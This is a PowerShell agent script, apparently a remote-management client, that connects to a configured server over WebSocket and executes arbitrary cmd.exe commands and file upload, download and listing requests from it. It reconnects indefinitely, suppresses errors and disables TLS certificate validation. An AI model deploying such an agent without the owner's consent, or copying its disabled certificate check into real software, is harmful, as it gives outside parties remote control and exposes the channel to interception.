# Injected at serve time: SERVER_URL, CLIENT_ID, CLIENT_SECRET
$ServerUrl = "SERVER_URL"
$ClientId = "CLIENT_ID"
$ClientSecret = "CLIENT_SECRET"

$wsUri = [System.Uri](($ServerUrl -replace 'https://','wss://' -replace 'http://','ws://') + '/live')
$auth = @{ client_id = $ClientId; client_secret = $ClientSecret } | ConvertTo-Json -Compress

function Send-WebSocketText {
  param([System.Net.WebSockets.ClientWebSocket]$ws, [string]$text, [System.Threading.CancellationToken]$ct)
  $bytes = [System.Text.Encoding]::UTF8.GetBytes($text)
  $segment = [System.ArraySegment[byte]]::new($bytes)
  $ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait()
}

function Receive-WebSocketText {
  param([System.Net.WebSockets.ClientWebSocket]$ws, [System.Threading.CancellationToken]$ct)
  $buf = [byte[]]::new(4096)
  $seg = [System.ArraySegment[byte]]::new($buf)
  $result = $ws.ReceiveAsync($seg, $ct).Result
  [System.Text.Encoding]::UTF8.GetString($buf, 0, $result.Count)
}

function Run-Command {
  param([string]$cmd)
  try {
    $p = [System.Diagnostics.Process]::new()
    $p.StartInfo.FileName = "cmd.exe"
    $p.StartInfo.Arguments = "/c $cmd"
    $p.StartInfo.RedirectStandardOutput = $true
    $p.StartInfo.RedirectStandardError = $true
    $p.StartInfo.UseShellExecute = $false
    $p.Start() | Out-Null
    $out = $p.StandardOutput.ReadToEnd() + $p.StandardError.ReadToEnd()
    $p.WaitForExit()
    $out
  } catch {
    $_.Exception.Message
  }
}

$MaxFileSize = 5 * 1024 * 1024

function Do-Upload {
  param([string]$path, [string]$contentB64)
  try {
    if ($path -match '\.\.' -or $path -match '^\s*$') { return $null, "invalid path" }
    $bytes = [Convert]::FromBase64String($contentB64)
    if ($bytes.Length -gt $MaxFileSize) { return $null, "file too large" }
    $dir = [System.IO.Path]::GetDirectoryName($path)
    if ($dir -and -not [System.IO.Directory]::Exists($dir)) { [System.IO.Directory]::CreateDirectory($dir) | Out-Null }
    [System.IO.File]::WriteAllBytes($path, $bytes)
    return "ok", $null
  } catch { return $null, $_.Exception.Message }
}

function Do-Download {
  param([string]$path)
  try {
    if ($path -match '\.\.' -or $path -match '^\s*$') { return $null, "invalid path" }
    if (-not [System.IO.File]::Exists($path)) { return $null, "not found" }
    $info = Get-Item -LiteralPath $path -Force -ErrorAction Stop
    if ($info.Length -gt $MaxFileSize) { return $null, "file too large" }
    $bytes = [System.IO.File]::ReadAllBytes($path)
    return [Convert]::ToBase64String($bytes), $null
  } catch { return $null, $_.Exception.Message }
}

function Do-ListDir {
  param([string]$path)
  try {
    if ($path -match '\.\.') { return $null, "invalid path" }
    if (-not $path) { $path = "." }
    $items = Get-ChildItem -LiteralPath $path -Force -ErrorAction Stop
    $list = @()
    foreach ($i in $items) {
      $list += @{ name = $i.Name; dir = $i.PSIsContainer; size = if ($i.PSIsContainer) { 0 } else { $i.Length } }
    }
    return ($list | ConvertTo-Json -Compress), $null
  } catch { return $null, $_.Exception.Message }
}

while ($true) {
  try {
    $ws = [System.Net.WebSockets.ClientWebSocket]::new()
    $ws.Options.RemoteCertificateValidationCallback = { $true }
    $ct = [System.Threading.CancellationToken]::new($false)
    $ws.ConnectAsync($wsUri, $ct).Wait()
    Send-WebSocketText -ws $ws -text $auth -ct $ct

    while ($ws.State -eq 'Open') {
      $json = Receive-WebSocketText -ws $ws -ct $ct
      if (-not $json) { break }
      $cmd = $json | ConvertFrom-Json
      $id = $cmd.id
      $out = ""
      $err = ""
      switch ($cmd.type) {
        "ping" { $out = "pong" }
        "exec" {
          $out = Run-Command -cmd $cmd.args.command
        }
        "upload" {
          $p = $cmd.args.path; $c = $cmd.args.content
          $o, $e = Do-Upload -path $p -contentB64 $c
          if ($e) { $err = $e } else { $out = $o }
        }
        "download" {
          $o, $e = Do-Download -path $cmd.args.path
          if ($e) { $err = $e } else { $out = $o }
        }
        "listdir" {
          $o, $e = Do-ListDir -path $cmd.args.path
          if ($e) { $err = $e } else { $out = $o }
        }
        default { $err = "unknown type: $($cmd.type)" }
      }
      $resp = @{ command_id = $id; status = if ($err) { "error" } else { "success" }; output = $out; error = $err } | ConvertTo-Json -Compress
      Send-WebSocketText -ws $ws -text $resp -ct $ct
    }
    $ws.Dispose()
  } catch {}
  Start-Sleep -Seconds 30
}
